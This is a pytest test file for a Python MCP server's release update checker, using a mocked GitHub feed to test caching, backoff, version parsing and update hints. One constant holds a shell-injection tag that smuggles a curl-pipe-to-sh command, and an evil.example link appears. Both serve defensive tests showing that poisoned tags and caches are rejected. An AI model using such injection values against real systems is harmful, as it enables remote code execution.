"""Release-based update check: suggest only, mocked GitHub, never the network."""

from __future__ import annotations

import json
import urllib.error

import pytest

from grok_delegate import __version__, update_check
from grok_delegate.server import handle_jsonrpc, handle_tool_call, list_tools
from grok_delegate.status import release_report

RELEASE_URL = "https://github.com/zai-one/grok-build-mcp/releases/tag/v99.0.0"


def _release(tag: str = "v99.0.0", **extra: object) -> bytes:
    return json.dumps({"tag_name": tag, "html_url": RELEASE_URL, "assets": [], **extra}).encode()


class FakeGitHub:
    def __init__(self, body: bytes | None = None, error: Exception | None = None) -> None:
        self.body, self.error, self.calls = body, error, []

    def __call__(self, url: str, timeout: float) -> bytes:
        self.calls.append((url, timeout))
        if self.error is not None:
            raise self.error
        assert self.body is not None
        return self.body


@pytest.fixture(autouse=True)
def _cache_dir(monkeypatch: pytest.MonkeyPatch, tmp_path) -> None:
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path / "cache"))


@pytest.fixture
def enabled(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("GROK_DELEGATE_DISABLE_UPDATE_CHECK", raising=False)
    monkeypatch.setattr(update_check, "_install_kind", lambda: "package")


def test_disabled_never_fetches() -> None:
    fetch = FakeGitHub(_release())
    assert update_check.check_for_update(fetch=fetch, force=True)["status"] == "disabled"
    assert fetch.calls == []
    assert update_check.cached_update_hint() is None
    assert release_report() == {"status": "disabled"}


def test_newer_release_suggests_pip_command(enabled) -> None:
    fetch = FakeGitHub(_release())
    result = update_check.check_for_update(fetch=fetch, now=1_000_000)
    assert fetch.calls == [(update_check.LATEST_RELEASE_API, update_check.TIMEOUT_SECONDS)]
    assert result["current_version"] == __version__
    assert result["latest_version"] == "99.0.0"
    assert result["update_available"] is True
    assert result["release_notes_url"] == RELEASE_URL
    assert result["update_command"] == (
        'python -m pip install --upgrade "grok-delegate @ git+https://github.com/zai-one/grok-build-mcp@v99.0.0"'
    )
    assert result["auto_update"] is False


def test_checkout_points_at_the_confirmed_updater(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(update_check, "_install_kind", lambda: "git")
    command = update_check.update_command("99.0.0", None)
    assert command.startswith("grok_agent_update (preview)")
    assert "git pull --ff-only" in command


def test_cache_is_reused_for_24_hours(enabled) -> None:
    update_check.check_for_update(fetch=FakeGitHub(_release()), now=1_000_000)
    later = FakeGitHub(_release("v100.0.0"))
    assert update_check.check_for_update(fetch=later, now=1_000_000 + 3_600)["source"] == "cache"
    assert later.calls == []
    fresh = update_check.check_for_update(fetch=later, now=1_000_000 + 25 * 3_600)
    assert fresh["latest_version"] == "100.0.0" and len(later.calls) == 1


def test_offline_and_stale_cache(enabled) -> None:
    offline = update_check.check_for_update(fetch=FakeGitHub(error=urllib.error.URLError("down")))
    assert offline["status"] == "unavailable" and offline["update_available"] is None
    update_check.check_for_update(fetch=FakeGitHub(_release()), now=1_000_000)
    stale = update_check.check_for_update(fetch=FakeGitHub(error=TimeoutError()), force=True, now=1_000_061)
    assert stale["source"] == "stale_cache" and stale["status"] == "unavailable"
    assert stale["latest_version"] == "99.0.0"


def test_offline_is_asked_once_per_backoff_window(enabled) -> None:
    down = FakeGitHub(error=urllib.error.URLError("down"))
    for offset in (0, 1, 60, 29 * 60):
        result = update_check.check_for_update(fetch=down, now=1_000_000 + offset)
        assert result["status"] == "unavailable"
    assert len(down.calls) == 1
    update_check.check_for_update(fetch=down, now=1_000_000 + 30 * 60)
    assert len(down.calls) == 2


def test_failure_after_a_good_check_keeps_the_last_good_result(enabled) -> None:
    update_check.check_for_update(fetch=FakeGitHub(_release()), now=1_000_000)
    down = FakeGitHub(error=urllib.error.URLError("down"))
    later = 1_000_000 + 25 * 3_600
    first = update_check.check_for_update(fetch=down, now=later)
    second = update_check.check_for_update(fetch=down, now=later + 600)
    assert len(down.calls) == 1
    for result in (first, second):
        assert result["status"] == "unavailable" and result["source"] == "stale_cache"
        assert result["latest_version"] == "99.0.0"


def test_force_is_honoured_once_a_minute(enabled) -> None:
    github = FakeGitHub(_release())
    for offset in (0, 1, 30, 59):
        assert update_check.check_for_update(fetch=github, force=True, now=1_000_000 + offset)["status"] == "update_available"
    assert len(github.calls) == 1
    update_check.check_for_update(fetch=github, force=True, now=1_000_060)
    assert len(github.calls) == 2


def test_force_is_throttled_without_any_successful_cache(enabled) -> None:
    down = FakeGitHub(error=urllib.error.URLError("down"))
    for offset in (0, 10, 59):
        result = update_check.check_for_update(fetch=down, force=True, now=1_000_000 + offset)
        assert result["status"] == "unavailable" and result["latest_version"] is None
    assert len(down.calls) == 1
    update_check.check_for_update(fetch=down, force=True, now=1_000_060)
    assert len(down.calls) == 2


def test_background_refresh_obeys_the_backoff(enabled, monkeypatch) -> None:
    down = FakeGitHub(error=urllib.error.URLError("down"))
    monkeypatch.setattr(update_check, "_default_fetch", down)
    worker = update_check.refresh_in_background()
    assert worker is not None
    worker.join(5)
    assert len(down.calls) == 1
    assert update_check.refresh_in_background() is None
    assert len(down.calls) == 1


def test_background_refresh_skips_a_fresh_cache(enabled, monkeypatch) -> None:
    update_check.check_for_update(fetch=FakeGitHub(_release()))
    github = FakeGitHub(_release("v100.0.0"))
    monkeypatch.setattr(update_check, "_default_fetch", github)
    assert update_check.refresh_in_background() is None
    assert github.calls == []


def test_unparseable_running_version_is_unknown(enabled, monkeypatch) -> None:
    monkeypatch.setattr(update_check, "__version__", "0.34.0.dev1+local")
    result = update_check.check_for_update(fetch=FakeGitHub(_release(tag="v0.1.0")))
    assert result["status"] == "unknown"
    assert result["update_available"] is None and result["update_command"] is None
    assert result["latest_version"] == "0.1.0"


INJECTION_TAG = 'v9.9.9";curl${IFS}x|sh;"'


def test_a_shell_shaped_tag_reaches_nothing(enabled) -> None:
    body = _release(tag=INJECTION_TAG, html_url=f"https://github.com/zai-one/grok-build-mcp/releases/tag/{INJECTION_TAG}")
    result = update_check.check_for_update(fetch=FakeGitHub(body), force=True)
    assert result["status"] == "unavailable"
    assert result["latest_version"] is None and result["update_command"] is None
    serialized = json.dumps(result)
    for fragment in ("9.9.9", "curl", "IFS", "|sh"):
        assert fragment not in serialized
    init = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"capabilities": {}}}
    assert "instructions" not in handle_jsonrpc(init)["result"]
    assert update_check.cached_update_hint() is None
    assert "curl" not in update_check.cache_path().read_text(encoding="utf-8")


def test_a_poisoned_cache_is_not_believed(enabled) -> None:
    path = update_check.cache_path()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(
            {
                "checked_at": 1_000_000,
                "latest_version": INJECTION_TAG,
                "release_url": "https://github.com/zai-one/grok-build-mcp/releases/tag/x\";curl",
            }
        ),
        encoding="utf-8",
    )
    assert update_check.cached_update_hint() is None
    init = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"capabilities": {}}}
    assert "instructions" not in handle_jsonrpc(init)["result"]
    # A good version with a foreign link: the version is kept, the link is not.
    path.write_text(
        json.dumps({"checked_at": 1_000_000, "latest_version": "v99.0.0", "release_url": "https://evil.example/"}),
        encoding="utf-8",
    )
    cached = update_check.check_for_update(fetch=FakeGitHub(error=AssertionError("no fetch")), now=1_000_100)
    assert cached["source"] == "cache" and cached["latest_version"] == "99.0.0"
    assert cached["release_notes_url"] == update_check.RELEASES_URL


def test_plain_tags_only() -> None:
    assert update_check.parse_version("v1.2.3") == (1, 2, 3)
    assert update_check.parse_version("1") == (1,)
    for bad in (INJECTION_TAG, " v1.2.3", "v1.2.3-rc1", "1.2.3.4.5", "v", "", None, 3):
        assert update_check.parse_version(bad) is None


def test_the_default_fetch_deadline_covers_name_resolution(monkeypatch) -> None:
    """urlopen's timeout does not bound getaddrinfo; the caller's deadline must."""
    import threading
    import time

    release = threading.Event()

    def stalled(url: str, timeout: float) -> bytes:
        release.wait(10)
        return b"{}"

    monkeypatch.setattr(update_check, "_urlopen_read", stalled)
    started = time.monotonic()
    try:
        with pytest.raises(TimeoutError):
            update_check._default_fetch(update_check.LATEST_RELEASE_API, 0.2)
        assert time.monotonic() - started < 3
    finally:
        release.set()


def test_install_kind_follows_the_verified_checkout(monkeypatch, tmp_path) -> None:
    import grok_delegate.updater as updater

    monkeypatch.setattr(updater, "bridge_checkout_dir", lambda *a, **k: None)
    assert update_check._install_kind() == "package"
    monkeypatch.setattr(updater, "bridge_checkout_dir", lambda *a, **k: tmp_path)
    assert update_check._install_kind() == "git"


@pytest.mark.parametrize(
    "body",
    [b"<html>", b"[]", _release(tag="nightly"), b"x" * 2_000_000],
    ids=["not-json", "json-array", "non-version-tag", "oversized"],
)
def test_malformed_responses_degrade(enabled, body: bytes) -> None:
    assert update_check.check_for_update(fetch=FakeGitHub(body))["status"] == "unavailable"


def test_same_version_and_foreign_link(enabled) -> None:
    body = _release(tag=f"v{__version__}", html_url="https://evil.example/")
    result = update_check.check_for_update(fetch=FakeGitHub(body))
    assert result["status"] == "up_to_date" and result["update_command"] is None
    assert result["release_notes_url"].startswith("https://github.com/zai-one/grok-build-mcp/releases/")


def test_hint_reaches_initialize_and_status_from_cache_only(enabled) -> None:
    init = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"capabilities": {}}}
    assert "instructions" not in handle_jsonrpc(init)["result"]
    assert release_report()["status"] == "no_newer_release_cached"
    update_check.check_for_update(fetch=FakeGitHub(_release()))
    instructions = handle_jsonrpc(init)["result"]["instructions"]
    assert "99.0.0" in instructions and "grok_agent_check_update" in instructions
    assert release_report()["status"] == "update_available"


def test_tool_is_listed_read_only_and_validates_arguments(enabled, monkeypatch) -> None:
    tool = {t["name"]: t for t in list_tools()}["grok_agent_check_update"]
    assert tool["annotations"]["readOnlyHint"] is True
    monkeypatch.setattr(update_check, "_default_fetch", FakeGitHub(_release()))
    result = handle_tool_call("grok_agent_check_update", {"force": True})
    assert result["ok"] is True and result["latest_version"] == "99.0.0"
    assert handle_tool_call("grok_agent_check_update", {"force": "yes"})["ok"] is False
    assert handle_tool_call("grok_agent_check_update", {"bogus": 1})["ok"] is False

